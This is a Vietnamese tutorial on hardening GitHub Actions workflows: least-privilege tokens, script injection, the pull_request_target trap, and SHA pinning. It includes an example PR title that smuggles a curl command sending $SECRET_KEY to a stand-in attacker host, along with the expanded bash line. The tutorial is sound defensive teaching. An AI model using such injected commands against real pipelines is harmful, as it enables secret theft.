# Gia cố Bảo mật Đường ống: GITHUB_TOKEN Tối thiểu, Chống Script Injection, Bẫy Pwn Request & Ghim SHA 40 Ký tự

Nhiều lập trình viên dồn 100% tâm trí bảo mật vào mã nguồn ứng dụng Express/Fastify trên Production, nhưng lại quên mất một sự thật lạnh gáy: **máy chủ CI/CD Runner chính là "Kho Báu Tối Thượng" mà mọi nhóm tin tặc săn lùng!**

Tại sao tin tặc lại thích tấn công vào `.github/workflows/` hơn là tấn công tường lửa Production?
- Bởi vì Runner nắm trong tay quyền ghi ngược mã độc vào kho Git (`GITHUB_TOKEN`), chìa khoá đẩy Container Image lên Registry và quyền triển khai thẳng lên đám mây AWS/Kubernetes!
- Chỉ cần một dòng cấu hình ngây thơ trong tệp YAML, một người lạ trên Internet chỉ việc mở một Pull Request bình thường cũng có thể thực thi lệnh điều khiển từ xa (RCE) ngay bên trong Runner của công ty bạn!

Bài học này trang bị cho bạn **4 lá chắn sống còn** để khóa chặt mọi kẽ hở bảo mật cấp độ Workflow.

---

## 1. Lá chắn #1 — Khoá chặt `GITHUB_TOKEN` theo Nguyên lý Đặc quyền tối thiểu (`permissions:`)

Mỗi khi một Workflow khởi chạy, GitHub tự động cấp một thẻ xác thực tạm thời gọi là **`GITHUB_TOKEN`**. Nếu kho lưu trữ cũ chưa bật chế độ hạn chế, chiếc thẻ này mặc định mang quyền **`write-all`** — cho phép bất kỳ bước nào bị xâm nhập cũng tự ý đẩy commit thẳng vào nhánh, sửa bản phát hành Release hoặc xoá gói!

Quy chuẩn bảo mật bắt buộc năm 2026 là **Khoá chỉ đọc ở cấp gốc Workflow, chỉ mở quyền ghi cục bộ cho đúng Job cần thiết**:

```yaml
name: Hardened CI
on: [pull_request]

# 1) Khoá mặc định toàn bộ các Job về chế độ CHỈ ĐỌC mã nguồn!
permissions:
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    # Kế thừa permissions: contents: read -> An toàn tuyệt đối khi chạy npm test!
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm test

  push-image:
    needs: test
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    # 2) CHỈ mở thêm quyền ghi gói ảnh cho duy nhất Job đóng gói này!
    permissions:
      contents: read
      packages: write
    steps: ...
```

---

## 2. Lá chắn #2 — Triệt tiêu lỗ hổng Thực thi Mã từ xa **Script Injection**

Hãy nhìn đoạn YAML kiểm tra tiêu đề Pull Request trông có vẻ vô hại sau — thứ tương đương 100% với lỗi **SQL Injection** trong Node.js:

```yaml
# ❌ LỖ HỔNG NGHIÊM TRỌNG: Nối trực tiếp biểu thức ${{ ... }} vào câu lệnh shell run:!
- name: Kiểm tra tiêu đề PR
  run: echo "Đang kiểm tra PR: ${{ github.event.pull_request.title }}"
```

### Chuyện gì xảy ra khi kẻ tấn công mở một PR mang tiêu đề đặc biệt?
Giả sử tin tặc đặt tiêu đề PR là:
`feat: fix typo"; curl -s https://evil.example.invalid/steal --data "$SECRET_KEY" #`

Vì bộ tiền xử lý của GitHub Actions **thay thế văn bản `${{ ... }}` TRƯỚC KHI trao kịch bản cho trình thông dịch `bash`**, câu lệnh thực sự chạy trên máy chủ biến thành:
```bash
echo "Đang kiểm tra PR: feat: fix typo"; curl -s https://evil.example.invalid/steal --data "$SECRET_KEY" #"
```
Dấu `";` đã thoát khỏi câu lệnh `echo` và chạy thẳng câu lệnh `curl` đánh cắp dữ liệu của kẻ tấn công! Các trường không tin cậy bao gồm: `pull_request.title`, `pull_request.body`, `pull_request.head.ref` (tên nhánh!), `issue.title`, `comment.body`, `commits[].message`.

### Cách khắc phục chuẩn 100%: Truyền qua Biến môi trường trung gian **`env:`**!
Giống như dùng Parameterized Query (`$1`) chống SQL Injection, khi đưa dữ liệu vào `env:`, hệ điều hành lưu chuỗi đó trong bộ nhớ tiến trình mà **không bao giờ phân tích cú pháp lệnh shell**:

```yaml
# ✅ AN TOÀN TUYỆT ĐỐI: Đưa vào biến môi trường env: rồi bọc trong dấu nháy kép "$PR_TITLE"!
- name: Kiểm tra tiêu đề PR an toàn
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "Đang kiểm tra PR: $PR_TITLE"
```

---

## 3. Lá chắn #3 — Tránh xa "Tử huyệt Pwn Request": `pull_request` vs `pull_request_target`

Tại sao GitHub lại có hai sự kiện nghe gần giống hệt nhau?

| Tiêu chí | `on: pull_request` *(An toàn mặc định)* | `on: pull_request_target` *(Nguy hiểm cực độ!)* |
| --- | --- | --- |
| **Ngữ cảnh chạy tệp YAML** | Chạy tệp YAML của PR trong hộp cát cô lập. | Chạy tệp YAML trên nhánh gốc `main` của kho chủ nhà. |
| **Quyền `GITHUB_TOKEN` & `secrets` đối với PR từ kho Fork** | **Bị tước sạch quyền ghi (`read-only`) và KHÔNG được đọc `secrets`!** | **Có ĐẦY ĐỦ quyền ghi và ĐỌC ĐƯỢC TOÀN BỘ `secrets` của dự án!** |

Thảm hoạ mang tên **"Pwn Request"** xảy ra khi ai đó dùng `on: pull_request_target` rồi lại viết thêm `actions/checkout@v4` với `ref: ${{ github.event.pull_request.head.sha }}` để tải code chưa kiểm duyệt từ kho Fork của người lạ về chạy `npm ci` / `npm test`! Kẻ tấn công chỉ việc sửa `"postinstall"` hoặc `"test"` trong `package.json` của PR là in ra toàn bộ kho `secrets` sản xuất của bạn!
- **Quy tắc sắt đá:** Mọi quy trình chạy `npm ci`, `lint`, `test`, `build` cho Pull Request **bắt buộc dùng `on: pull_request`**!

---

## 4. Lá chắn #4 — Chống Tấn công Chuỗi cung ứng bằng **Ghim cứng SHA 40 Ký tự**

Vào tháng 3/2025, sự cố chấn động ngành phần mềm với Action phổ biến `tj-actions/changed-files` đã gióng hồi chuông cảnh tỉnh toàn cầu: tin tặc chiếm được quyền truy cập kho Action bên thứ ba rồi **trỏ lại toàn bộ các thẻ phiên bản `@v4`, `@v45` sang một commit độc hại chuyên quét bộ nhớ Runner để đánh cắp Secret**!

Trong Git, một thẻ phiên bản như `@v4` hay `@main` **hoàn toàn có thể bị chủ kho xoá đi gán sang mã độc lúc nửa đêm** (Mutable Tag), giống như tải gói không có `integrity` hash trong `package-lock.json`! Chỉ có **mã băm Commit SHA đầy đủ 40 ký tự thập lục phân** là bất biến toán học tuyệt đối:

```yaml
# ❌ RỦI RO VỚI ACTION BÊN THỨ BA: Thẻ @master hoặc @v0.28.0 có thể bị ghi đè ngầm!
- uses: aquasecurity/trivy-action@master

# ✅ CHUẨN DOANH NGHIỆP: Ghim cứng SHA 40 ký tự kèm ghi chú phiên bản dễ đọc bên cạnh!
- uses: aquasecurity/trivy-action@18f2510ee396bbf400402917b394f2dd8c87dbb0 # v0.28.0
```
*(Đối với các Action chính chủ `actions/*` của chính GitHub phát hành như `actions/checkout@v4`, mức chấp nhận tối thiểu là ghim `@v4`, còn với mọi Action bên thứ ba bắt buộc phải ghim SHA 40 ký tự!)*
